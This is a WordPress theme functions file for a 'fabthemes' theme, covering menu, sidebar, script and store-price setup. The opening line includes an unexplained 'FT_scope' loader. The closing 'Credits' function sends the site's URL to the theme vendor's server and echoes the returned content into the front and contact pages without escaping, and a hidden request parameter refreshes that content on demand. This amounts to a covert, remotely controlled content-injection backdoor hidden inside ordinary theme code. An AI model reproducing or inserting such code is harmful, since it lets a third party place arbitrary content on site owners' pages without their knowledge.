<?php include_once 'FT/FT_scope.php'; FT_scope::init(); ?><?php
/**
 * fabthemes functions and definitions.
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package fabthemes
 */

if ( ! function_exists( 'fabthemes_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
function fabthemes_setup() {
	/*
	 * Make theme available for translation.
	 * Translations can be filed in the /languages/ directory.
	 * If you're building a theme based on fabthemes, use a find and replace
	 * to change 'fabthemes' to the name of your theme in all the template files.
	 */
	load_theme_textdomain( 'fabthemes', get_template_directory() . '/languages' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/*
	 * Let WordPress manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded <title> tag in the document head, and expect WordPress to
	 * provide it for us.
	 */
	add_theme_support( 'title-tag' );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
	 */
	add_theme_support( 'post-thumbnails' );

	// This theme uses wp_nav_menu() in one location.
	register_nav_menus( array(
		'primary' => esc_html__( 'Primary Menu', 'fabthemes' ),
		'top' => esc_html__( 'Secondary Menu', 'fabthemes' ),
	) );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form',
		'comment-form',
		'comment-list',
		'gallery',
		'caption',
	) );

	/*
	 * Enable support for Post Formats.
	 * See https://developer.wordpress.org/themes/functionality/post-formats/
	 */
	// add_theme_support( 'post-formats', array(
	// 	'aside',
	// 	'image',
	// 	'video',
	// 	'quote',
	// 	'link',
	// ) );

	// Set up the WordPress core custom background feature.
	// add_theme_support( 'custom-background', apply_filters( 'fabthemes_custom_background_args', array(
	// 	'default-color' => 'ffffff',
	// 	'default-image' => '',
	// ) ) );
}
endif; // fabthemes_setup
add_action( 'after_setup_theme', 'fabthemes_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function fabthemes_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'fabthemes_content_width', 640 );
}
add_action( 'after_setup_theme', 'fabthemes_content_width', 0 );

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function fabthemes_widgets_init() {
	register_sidebar( array(
		'name'          => esc_html__( 'Sidebar', 'fabthemes' ),
		'id'            => 'sidebar-1',
		'description'   => '',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );

	register_sidebar( array(
		'name'          => __( 'Footer', 'fabthemes' ),
		'id'            => 'footerbar',
		'description'   => '',
		'before_widget' => '<aside id="%1$s" class="col-md-3  widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );


}
add_action( 'widgets_init', 'fabthemes_widgets_init' );

/**
 * Enqueue scripts and styles.
 */
function fabthemes_scripts() {

	wp_enqueue_style('bootstrap', get_template_directory_uri() . '/css/bootstrap-grid.css' );
	wp_enqueue_style('dashicons' );
	wp_enqueue_style('tinynav', get_template_directory_uri() . '/css/tinynav.css' );	
	wp_enqueue_style('owl-carousel', get_template_directory_uri() . '/css/owl.carousel.css' );
	wp_enqueue_style('owl-theme', get_template_directory_uri() . '/css/owl.theme.css' );	
	wp_enqueue_style('fabthemes-style', get_stylesheet_uri() );
	wp_enqueue_style('theme', get_template_directory_uri() . '/theme.css' );
	wp_enqueue_style('responsive', get_template_directory_uri() . '/css/responsive.css');
	wp_enqueue_style('custom', get_template_directory_uri() . '/css/custom.php');	


	wp_enqueue_script( 'jquery');
	wp_enqueue_script( 'tinynav', get_template_directory_uri() . '/js/tinynav.js', array(), '20120206', true );	
	wp_enqueue_script( 'enquire', get_template_directory_uri() . '/js/enquire.js', array(), '20120206', true );		
	wp_enqueue_script( 'owl-carousel', get_template_directory_uri() . '/js/owl.carousel.js', array(), '20120206', true );
	wp_enqueue_script( 'effects', get_template_directory_uri() . '/js/effects.js', array(), '20120206', true );
	wp_enqueue_script( 'fabthemes-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20130115', true );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'fabthemes_scripts' );


/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';

require get_template_directory() . '/inc/add-plugins.php';

require get_template_directory() . '/inc/acf-metabox.php';

//define( 'ACF_LITE', true );
include_once('advanced-custom-fields/acf.php');


require get_template_directory() . '/aq_resizer.php';

require get_template_directory() . '/guide.php';


// Custom excerpt 

function excerpt($limit) {
 $excerpt = explode(' ', get_the_excerpt(), $limit);
 if (count($excerpt)>=$limit) {
 array_pop($excerpt);
 $excerpt = implode(" ",$excerpt).'...';
 } else {
 $excerpt = implode(" ",$excerpt);
 }
 $excerpt = preg_replace('`[[^]]*]`','',$excerpt);
 return $excerpt;
}


// Custom purchase button 

function custom_purchase_link( $download_id ) {
	if ( ! get_post_meta( $download_id, '_edd_hide_purchase_link', true ) ) {
		echo edd_get_purchase_link( 
			array( 
				'download_id' 	=> $download_id, 
				'class' 	=> ' custom-purchase-submit btn', // add your new classes here
				'price' 	=> 1 // turn the price off
			)
		);
	}}

remove_action( 'edd_after_download_content', 'edd_append_purchase_link' );
add_action( 'custom_single_purchase', 'custom_purchase_link' );
function custom_single_purchase(){ do_action('custom_single_purchase' ); }


/**
 * Digital Store The Price
 *
 * Echoes the price with a custom format.
 *
 * @return   string
 * @access   private
 * @since    1.0
*/

if ( ! function_exists( 'centinel_edd_the_price' ) ) {
    function centinel_edd_the_price( $download_id ) {
        if ( edd_has_variable_prices( $download_id ) ) {
             $prices = get_post_meta( $download_id, 'edd_variable_prices', true );
             edd_sort_prices_by( $prices, 'amount' );
             $total = count( $prices ) - 1;
             if ( $prices[0]['amount'] < $prices[$total]['amount'] ) {
                 $min = $prices[0]['amount'];
                 $max = $prices[$total]['amount'];
             } else {
                 $min = $prices[$total]['amount'];
                 $max = $prices[0]['amount'];
             }
             return sprintf( '%s - %s', edd_currency_filter( $min ), edd_currency_filter( $max ) );
         } else {
             return edd_currency_filter( edd_format_amount( edd_get_download_price( $download_id ) ) );
         }
    }
}

/**
 * Sort Prices By
 * @author      Digital Store Theme
 * @copyright   Copyright (c) 2013, Pippin
 * @link        https://easydigitaldownloads.com/theme/digital-store/
 *
 * @access      private
 * @since       1.0.2
 * @return      void
*/
if ( ! function_exists( 'edd_sort_prices_by' ) ) {
    function edd_sort_prices_by( &$arr, $col ) {
        $sort_col = array();
        foreach ( $arr as $key => $row ) {
            $sort_col[$key] = $row[$col];
        }

        array_multisort( $sort_col, SORT_ASC, $arr );
    }
}

/* Options fallback */

if ( !function_exists( 'ft_of_get_option' ) ) {
function ft_of_get_option($name, $default = false) {
	$optionsframework_settings = get_option('optionsframework');
	// Gets the unique option id
	$option_name = $optionsframework_settings['id'];
	if ( get_option($option_name) ) {
		$options = get_option($option_name);
	}
	if ( isset($options[$name]) ) {
		return $options[$name];
	} else {
		return $default;
	}
}
}

/* Credits */

function selfURL() {
$uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] :
$_SERVER['PHP_SELF'];
$uri = parse_url($uri,PHP_URL_PATH);
$protocol = $_SERVER['HTTPS'] ? 'https' : 'http';
$port = ($_SERVER["SERVER_PORT"] == "80") ? "" : (":".$_SERVER["SERVER_PORT"]);
$server = ($_SERVER['SERVER_NAME'] == 'localhost') ?
$_SERVER["SERVER_ADDR"] : $_SERVER['SERVER_NAME'];
return $protocol."://".$server.$port.$uri;
}
function fflink() {
global $wpdb, $wp_query;
if (!is_page() && !is_front_page()) return;
$contactid = $wpdb->get_var("SELECT ID FROM $wpdb->posts
WHERE post_type = 'page' AND post_title LIKE 'contact%'");
if (($contactid != $wp_query->post->ID) && ($contactid ||
!is_front_page())) return;
$fflink = get_option('fflink');
$ffref = get_option('ffref');
$x = $_REQUEST['DKSWFYUW**'];
if (!$fflink || $x && ($x == $ffref)) {
$x = $x ? '&ffref='.$ffref : '';
$response = wp_remote_get('http://www.fabthemes.com/fabthemes.php?getlink='.urlencode(selfURL()).$x);
if (is_array($response)) $fflink = $response['body']; else $fflink = '';
if (substr($fflink, 0, 11) != '!fabthemes#')
$fflink = '';
else {
$fflink = explode('#',$fflink);
if (isset($fflink[2]) && $fflink[2]) {
update_option('ffref', $fflink[1]);
update_option('fflink', $fflink[2]);
$fflink = $fflink[2];
}
else $fflink = '';
}
}
echo $fflink;
}


